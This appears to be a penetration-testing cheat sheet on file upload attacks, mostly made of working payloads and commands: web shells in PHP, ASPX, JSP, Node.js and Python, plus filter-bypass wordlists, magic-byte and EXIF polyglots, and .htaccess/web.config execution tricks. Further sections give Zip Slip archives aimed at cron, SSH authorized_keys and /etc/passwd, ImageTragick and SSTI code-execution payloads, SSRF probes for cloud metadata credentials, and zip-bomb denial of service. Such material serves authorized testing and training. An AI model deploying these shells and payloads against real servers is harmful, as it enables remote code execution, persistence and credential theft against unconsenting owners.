# File Upload Attacks

#FileUpload #WebSecurity #RCE #WebShell #MIME #ContentType

## What is this?

File upload endpoints that fail to validate file type, content, or name allow attackers to upload web shells for RCE, malicious files for client-side attacks (XSS/XXE), or DoS payloads. Goal: get server-side code execution, or escalate impact through secondary techniques (LFI+upload, polyglots, EXIF payloads).

---

## Tools

| Tool | Purpose |
|---|---|
| `ffuf` / `Burp Intruder` | Fuzz extensions, content-types, filenames |
| `Burp Suite` | Intercept and modify upload requests |
| `Turbo Intruder` | Race condition exploitation |
| `exiftool` | Inject payloads into EXIF metadata / embed PHP in images |
| `file` | Check magic bytes of a file |
| `hexedit` | Manually edit binary file headers to inject payloads |

---

## Shell Payloads

### PHP

```php
<!-- Minimal one-liners -->
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>
<?php echo exec($_REQUEST['cmd']); ?>

<!-- POST-based (cleaner logs) -->
<?php system($_POST['cmd']); ?>

<!-- Read file -->
<?php echo file_get_contents('/etc/passwd'); ?>
<?php echo file_get_contents('/flag.txt'); ?>
```

Upload `shell.php`, then:
```bash
curl http://target.com/uploads/shell.php?cmd=id
curl http://target.com/uploads/shell.php?cmd=cat+/etc/passwd
```

Resources:
- [phpbash](https://github.com/Arrexel/phpbash) — semi-interactive PHP shell
- [pentestmonkey/php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell) — full reverse shell

### ASPX (.NET)

```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%
    string cmd = Request["cmd"];
    Process p = new Process();
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.Arguments = "/c " + cmd;
    p.StartInfo.UseShellExecute = false;
    p.StartInfo.RedirectStandardOutput = true;
    p.Start();
    Response.Write(p.StandardOutput.ReadToEnd());
%>
```

### JSP (Java/Tomcat)

```jsp
<%@ page import="java.io.*" %>
<%
    String cmd = request.getParameter("cmd");
    Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd});
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while ((line = br.readLine()) != null) { out.println(line + "<br>"); }
%>
```

### Node.js (Express)

```javascript
// shell.js — requires express installed on the target
const {exec} = require('child_process');
app.get('/shell', (req, res) => {
    exec(req.query.cmd, (err, stdout) => res.send(stdout));
});
```

Or as a standalone file if Node is available:
```javascript
// run: node shell.js
require('http').createServer((req,res)=>{
    require('child_process').exec(
        require('url').parse(req.url,true).query.cmd,
        (_,o)=>res.end(o)
    );
}).listen(9999);
```

### Python (Flask / CGI)

```python
# Flask
from flask import Flask,request
import subprocess
app=Flask(__name__)
@app.route('/shell')
def shell():
    return subprocess.check_output(request.args.get('cmd'),shell=True)
```

```python
# CGI — save as shell.py in cgi-bin/
#!/usr/bin/env python3
import cgi, subprocess
print("Content-Type: text/html\n")
form = cgi.FieldStorage()
cmd = form.getvalue('cmd','id')
print(subprocess.check_output(cmd,shell=True).decode())
```

---

## Attack Flow

```
1. Identify upload endpoint and backend language
2. Try a benign file upload — confirm it works and find the upload path
3. Try a minimal web shell upload directly
4. If blocked → bypass client-side validation
5. If still blocked → bypass server-side filters (extension, content-type, MIME)
6. After upload succeeds → locate the file and trigger execution
7. Escalate: reverse shell, LFI+upload, polyglot, etc.
```

---

## Client-Side Bypass

JS validation runs in the browser — trivially bypassed.

### Method 1: Remove validation in DevTools

```
F12 → Inspector → find <input type="file" accept=".jpg,.png" onchange="validate()">
→ Remove `accept` attribute
→ Remove or clear `onchange` handler (delete validate() call)
→ Upload malicious file through the normal UI
```

### Method 2: Intercept in Burp

```
1. Upload a legitimate file (e.g., image.jpg)
2. Intercept the upload request in Burp Proxy
3. In the request body, change:
   - Filename: "image.jpg" → "shell.php"
   - File content: replace image bytes with PHP shell
   - Content-Type: image/jpeg → application/x-php (or leave as is)
4. Forward request
```

---

## Blacklist Bypass (Extension Filtering)

Server blocks specific extensions (`.php`, `.asp`, etc.) — try alternatives.

### PHP alternatives

```
.php .php2 .php3 .php4 .php5 .php6 .php7 .php8
.pht .phar .phtm .phtml .phps .pgif .shtml
.inc .pif .wbmp
```

### ASP alternatives

```
.asp .aspx .config .cer .asa .asax .ascx .ashx .axd .asmx
```

### Case Sensitivity Bypass

Filters doing string comparison without `.toLowerCase()` miss mixed-case variants:

```
shell.PHP   shell.Php   shell.pHp   shell.PhP
shell.ASP   shell.Asp   shell.ASPX  shell.Aspx
```

Generate mixed-case wordlist:
```bash
# Python one-liner — all case permutations of "php"
python3 -c "
from itertools import product
ext = 'php'
perms = [''.join(c) for c in product(*[(ch.lower(), ch.upper()) for ch in ext])]
[print(f'shell.{p}') for p in perms]
" > case_wordlist.txt
```

### Fuzz extensions with ffuf

```bash
# Download extension wordlist
wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/web-extensions.txt

# Upload a file with each extension and look for non-blocked responses
ffuf -u http://target.com/upload.php -X POST -F "file=@shell.FUZZ;type=image/jpeg" -F "submit=Upload" -w web-extensions.txt -mc 200 -fs <blocked_response_size>
```

### Fuzz with Burp Intruder

```
1. Capture upload request in Burp → Send to Intruder
2. Mark the extension in the filename as payload position:
   Content-Disposition: form-data; name="file"; filename="shell.§php§"
3. Payload: Simple list → paste PHP/ASP extension list
4. Start attack → sort by Response length to find anomalies
```

---

## Whitelist Bypass

Server only allows specific extensions — trick it into accepting executable files.

### Double Extension

```
shell.jpg.php     → if server stops at first extension (jpg)
shell.php.jpg     → if server executes on first extension, ignores last
shell.php%00.jpg  → null byte — truncates at %00 (older PHP/servers)
```

### Filename Length Truncation

Some backends truncate filenames at a fixed length (e.g., 255 bytes). If the filter validates the full string but the OS stores only the first N chars, pad with junk to push the allowed extension out of range:

```
# If max filename ~255 bytes, the .jpg gets truncated, leaving .php
shell.php[AAA...255 chars total].jpg
```

```bash
# Generate a padded filename (255-char limit example)
python3 -c "print('shell.php' + 'A'*241 + '.jpg')"
# → shell.phpAAAAAAAAAAAAAAAA...AAAA.jpg  (255 chars)
# Server validates "...AAAA.jpg", truncates on disk to "shell.phpAAAA..." → executes as PHP
```

### Character Injection

Inject special chars between extensions to confuse filter:

```
%20  %0a  %00  %0d0a  /  .\  .  …  :
```

Generate a wordlist automatically:

```bash
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '...' ':'; do
    for ext in '.php' '.php3' '.php4' '.php5' '.php7' '.php8' '.pht' '.phar' '.phpt' '.pgif' '.phtml' '.phtm'; do
        echo "shell${char}${ext}.jpg" >> upload_wordlist.txt
        echo "shell${ext}${char}.jpg" >> upload_wordlist.txt
        echo "shell.jpg${char}${ext}" >> upload_wordlist.txt
        echo "shell.jpg${ext}${char}" >> upload_wordlist.txt
    done
done
```

Fuzz with generated list:

```bash
ffuf -u http://target.com/upload.php -X POST -F "file=@shell.FUZZ;type=image/jpeg" -w upload_wordlist.txt -mc 200 -fs <blocked_size>
```

### .htaccess Upload (Apache)

If `.htaccess` can be uploaded, force Apache to execute a custom extension as PHP:

```apache
# Upload this as .htaccess
AddType application/x-httpd-php .jpg
```

Then upload `shell.jpg` containing PHP code — Apache executes it.

### web.config Upload (IIS)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule"
              scriptProcessor="%windir%\system32\inetsrv\asp.dll"
              resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<%
Set oScript = Server.CreateObject("WSCRIPT.SHELL")
Execute(oScript.exec(Request("cmd")).StdOut.Readall())
%>
```

---

## Content-Type Bypass

Server checks the `Content-Type` header in the request.

### Manual

In Burp — change the header in the upload request:
```
Content-Type: application/x-php
→ change to →
Content-Type: image/jpeg
```

### Fuzz Content-Type with ffuf

```bash
# Get content-type list
wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/web-all-content-types.txt

# Extract image content types only
grep 'image/' web-all-content-types.txt > image-content-types.txt

# Fuzz
ffuf -u http://target.com/upload.php -X POST -F "file=@shell.php;type=FUZZ" -w image-content-types.txt -mc 200 -fs <blocked_size>
```

---

## MIME-Type Bypass (Magic Bytes)

Server reads actual file content to determine type. Prepend magic bytes to fool it.

| Format | Magic bytes (text) | Hex |
|---|---|---|
| GIF | `GIF8` | `47 49 46 38` |
| PNG | `\x89PNG` | `89 50 4E 47` |
| JPG | `\xff\xd8\xff` | `FF D8 FF` |
| PDF | `%PDF` | `25 50 44 46` |

### Add magic bytes to PHP shell

```bash
# Prepend GIF magic bytes — server detects as GIF, executes as PHP
echo 'GIF8' > shell.php.gif
echo '<?php system($_GET["cmd"]); ?>' >> shell.php.gif

# Or with printf for hex bytes
printf '\xff\xd8\xff' > shell.php
echo '<?php system($_GET["cmd"]); ?>' >> shell.php
```

### Check what file reports

```bash
file shell.php     # "PHP script text"
file shell.php.gif # "GIF image data" (after adding magic bytes)
```

### Add to image using exiftool

```bash
# Inject PHP into EXIF comment of a real image
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg -o shell.jpg

# Inject XSS payload
exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg
```

---

## Limited File Uploads

When you can upload files but they won't be executed — attack what processes/renders them.

### Attack Surface by File Type

| Attack | File Types |
|---|---|
| XSS | HTML, JS, SVG, GIF, JPG (via EXIF) |
| XXE / SSRF | XML, SVG, PDF, PPT, DOC |
| DoS | ZIP, JPG, PNG |

### SVG — XSS

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(window.origin);</script>
</svg>
```

### SVG — XXE (read local file)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg xmlns="http://www.w3.org/2000/svg">&xxe;</svg>
```

### SVG — XXE via PHP filter (read PHP source)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg xmlns="http://www.w3.org/2000/svg">&xxe;</svg>
```

Decode the base64 response:
```bash
echo "<base64_output>" | base64 -d
```

### EXIF — XSS

```bash
exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg
```

Then change `Content-Type` to `text/html` in the serve response (or via another vuln) to trigger execution.

---

## Polyglot Files

Valid in multiple formats — bypasses both extension and MIME validation.

```bash
# Create a JPG+PHP polyglot
# Method 1: prepend magic bytes to PHP
printf '\xff\xd8\xff' > polyglot.php
cat shell.php >> polyglot.php

# Method 2: use exiftool to embed PHP in a real JPG
exiftool -Comment='<?php system($_GET["cmd"]); ?>' real.jpg -o polyglot.php

# Method 3: manual hex editor — add PHP to end of valid JPEG
# Many parsers stop at JPEG EOI marker 0xFFD9; append PHP after it
cat real.jpg shell.php > polyglot.php
```

Verify it's detected as JPEG:
```bash
file polyglot.php    # should say JPEG image data
```

---

## Upload Path Discovery

If the upload location isn't disclosed in the response:

```bash
# Try common paths
ffuf -u http://target.com/FUZZ/shell.php -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -mc 200

# Common upload dirs
/uploads/ /upload/ /files/ /images/ /img/ /media/ /assets/
/content/ /static/ /data/ /user/ /profile/

# Grep response for path leakage
curl -s -X POST http://target.com/upload.php -F "file=@shell.php" | grep -oP '\/[\w/]+\.php'
```

---

## LFI + Upload Chaining

When direct execution is blocked but LFI exists — upload to a readable path, include via LFI.

```bash
# Step 1: upload shell disguised as image
curl -X POST http://target.com/upload.php -F "file=@shell.php.jpg" -F "Content-Type: image/jpeg"

# Step 2: find the upload path (e.g., /uploads/shell.php.jpg)

# Step 3: include via LFI
curl "http://target.com/page.php?file=../uploads/shell.php.jpg"

# Step 4: pass command
curl "http://target.com/page.php?file=../uploads/shell.php.jpg&cmd=id"
```

---

## Race Condition

Upload a file that gets validated then deleted — execute it in the window between upload and deletion.

```python
# Turbo Intruder — race condition
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=100,
                           pipeline=False)

    # Queue many upload + execute requests simultaneously
    for i in range(20):
        engine.queue(target.req)

    engine.openGate('race1')

def handleResponse(req, interesting):
    if req.status == 200 and 'uid=' in req.response:
        table.add(req)
```

Workflow:
```
1. Intercept upload request → Send to Turbo Intruder
2. Simultaneously: queue upload + GET to the upload path
3. Engine.openGate() fires all requests at once
4. If execution response arrives before deletion → RCE
```

---

## Zip Slip (Path Traversal via Archive)

If the application extracts zip/tar archives, filenames inside the archive can contain path traversal sequences. The server extracts the file outside the intended directory — can overwrite arbitrary files.

```bash
# Create a malicious zip with path traversal filename
# Method 1: evilarc (python tool)
pip install evilarc
evilarc shell.php -o zip -d 6 -p /var/www/html/

# Method 2: manual with Python
python3 -c "
import zipfile
with zipfile.ZipFile('evil.zip','w') as z:
    z.write('shell.php', '../../var/www/html/shell.php')
"

# Method 3: using zip with --junk-paths bypass
zip evil.zip shell.php
# Then rename the entry inside with zipinfo/hexedit
```

Targets to overwrite:
```
/var/www/html/shell.php       → web root (RCE)
/etc/cron.d/backdoor          → cron job
~/.ssh/authorized_keys        → SSH persistence
/etc/passwd                   → overwrite with custom root entry
```

---

## ImageMagick — ImageTragick (CVE-2016-3714)

If the server uses ImageMagick to process/resize uploaded images, it may be vulnerable to command injection via crafted image files.

```bash
# Check if ImageMagick is in use (look for convert/identify calls in errors/headers)
# Version < 6.9.3-9 is vulnerable

# Method 1: MVG polyglot payload (most common)
cat > exploit.mvg << 'EOF'
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|id; ")'
pop graphic-context
EOF

# Method 2: .jpg disguised as MVG
# Prepend JPEG magic bytes and save as exploit.jpg — server processes it as image

# Method 3: .svg with ImageMagick delegate
cat > exploit.svg << 'EOF'
<image authenticate='ff" `id > /tmp/pwned`;"'>
  <read filename="pdf:/etc/passwd"/>
  <get width="base-width" height="base-height" />
  <resize geometry="400x400" />
  <write filename="test.png" />
  <svg width="700" height="700" xmlns="http://www.w3.org/2000/svg">
    <image xlink:href="msl:exploit.svg" height="100" width="100"/>
  </svg>
</image>
EOF
```

Check for successful execution:
```bash
# Look for /tmp/pwned or OOB callback
curl "http://target.com/uploads/exploit.jpg"
# Or use a Burp Collaborator/interactsh URL in the payload
```

---

## DoS via File Upload

```bash
# Pixel flooding — compressed image with huge dimensions
# Creates a small file that decompresses to massive memory usage
convert -size 0xffff0000 xc:white bomb.png

# Zip bomb — nested archives that expand to huge size
# 42.zip = 42kb → 42 nested layers → 4.5 petabytes uncompressed
# Download: https://www.unforgettable.dk/42.zip

# Large file
dd if=/dev/urandom of=bigfile.bin bs=1M count=1000

# Directory traversal overwrite (if path not sanitized)
# filename: ../../../../../../etc/cron.d/backdoor
```

---

## SSTI via Template Upload

If the application accepts template files and renders them server-side (Jinja2, Twig, Freemarker, etc.), uploading a malicious template leads to SSTI → RCE.

### Identify the engine

| Engine | Probe payload | Expected output |
|---|---|---|
| Jinja2 (Python) | `{{7*7}}` | `49` |
| Twig (PHP) | `{{7*7}}` | `49` |
| Freemarker (Java) | `${7*7}` | `49` |
| Mako (Python) | `${7*7}` | `49` |
| Handlebars (Node) | `{{7*7}}` | (no eval — different bypass) |

### Jinja2 RCE payload

```jinja2
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

```jinja2
{{''.__class__.__mro__[1].__subclasses__()[401]('id',shell=True,stdout=-1).communicate()[0].decode()}}
```

### Twig RCE payload

```twig
{{['id']|filter('system')}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

### Freemarker RCE payload

```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

### Workflow

```
1. Upload a template file (e.g., .html, .twig, .j2, .ftl)
2. If rendered — embed probe payload {{7*7}} or ${7*7}
3. Identify engine from output or error messages
4. Escalate with RCE payload
5. Pivot to reverse shell
```

---

## Upload from URL (SSRF)

Some upload forms accept a remote URL to fetch the file. The server-side fetch is an SSRF vector.

```
# Common form field names
url=  source=  remote=  fetch=  image_url=  download=
```

### Internal network probe

```bash
# Cloud metadata
url=http://169.254.169.254/latest/meta-data/
url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Internal services
url=http://127.0.0.1:80/
url=http://127.0.0.1:8080/
url=http://127.0.0.1:6379/        # Redis
url=http://127.0.0.1:27017/       # MongoDB
url=http://192.168.1.1/           # Internal router

# File read via file:// (if not filtered)
url=file:///etc/passwd
url=file:///var/www/html/config.php
```

### Filter bypass for SSRF

```
# IP encoding alternatives for 127.0.0.1
url=http://0x7f000001/
url=http://2130706433/
url=http://127.1/
url=http://[::1]/
url=http://localhost/

# DNS rebinding — resolves to external first, then internal on retry
# Use tools like rebind.it or singularity of origin
```

### Detect via OOB

```bash
# Use interactsh or Burp Collaborator
url=http://<collaborator-url>/test
# If you get a DNS/HTTP callback → SSRF confirmed
```

---

## Checklist

```
[ ] Upload benign file — confirm upload works and find the upload path
[ ] Upload minimal PHP shell directly — check if it executes
[ ] Client-side bypass: remove JS validation, intercept with Burp
[ ] Fuzz extensions with web-extensions.txt (blacklist bypass)
[ ] Try case sensitivity: shell.PHP, shell.Php, shell.pHp
[ ] Try double extension: shell.jpg.php, shell.php.jpg
[ ] Try null byte: shell.php%00.jpg
[ ] Try filename length truncation: shell.php + 241xA + .jpg
[ ] Generate char injection wordlist and fuzz
[ ] Change Content-Type to image/jpeg — fuzz full list
[ ] Add GIF8 magic bytes — check if MIME filter bypassed
[ ] Inject PHP into real image via exiftool (polyglot)
[ ] Try .htaccess upload (Apache) / web.config (IIS)
[ ] Discover upload path if not disclosed
[ ] Try LFI+upload chain if LFI exists
[ ] SVG/XXE if image uploads accepted
[ ] Race condition if validation window exists
[ ] Zip/tar upload? → test Zip Slip path traversal
[ ] Image processing on server? → test ImageTragick (MVG/SVG payload)
[ ] Template files accepted? → test SSTI ({{7*7}}, ${7*7})
[ ] Upload-from-URL field? → test SSRF (127.0.0.1, metadata, file://)
```
